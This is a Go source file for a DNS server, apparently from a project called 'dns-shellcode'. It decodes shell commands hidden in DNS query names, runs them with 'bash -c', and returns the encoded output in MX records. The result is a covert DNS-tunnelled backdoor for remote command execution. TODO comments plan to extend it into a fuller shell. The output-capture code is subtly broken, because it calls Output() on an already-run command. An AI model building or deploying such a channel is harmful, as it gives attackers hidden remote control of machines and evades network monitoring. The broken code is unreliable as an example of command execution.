package main

import "C"
import (
	"dns-shellcode/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os"
	"os/exec"
)

type dnsHandler struct{}

func main() {
	handler := new(dnsHandler)
	server := &dns.Server{
		Addr:      ":8090",
		Net:       "udp",
		Handler:   handler,
		UDPSize:   65535,
		ReusePort: true,
	}

	fmt.Println("Starting DNS server on port 8090")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		command := encoder.Decode(question.Name)
		fmt.Printf("Received command: %s\n", command)
		output := getOutputAsString(createCmd(command))
		fmt.Printf("Result: %s", output)
		encoded := encoder.Encode(output)
		rr, _ := dns.NewRR(encoded + " 3600 IN MX 10 example.com")
		msg.Answer = append(msg.Answer, rr)
	}
	w.WriteMsg(msg)
}

//todo create shell impl -> have command buffer/stack? prefix? -> exec command "cd .., ls" for instance
// => currently working: "cd .. && ls"
//todo: clear stack
//
//
//todo: implement msg splitter
// => current problem: header size too big, reicv fails with header overflow
//todo: tcp instead of udp?

func createCmd(command string) *exec.Cmd {
	cmd := exec.Command("bash", "-c", command)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
	return cmd
}

func getOutputAsString(cmd *exec.Cmd) string {
	output, _ := cmd.Output()
	return string(output)
}
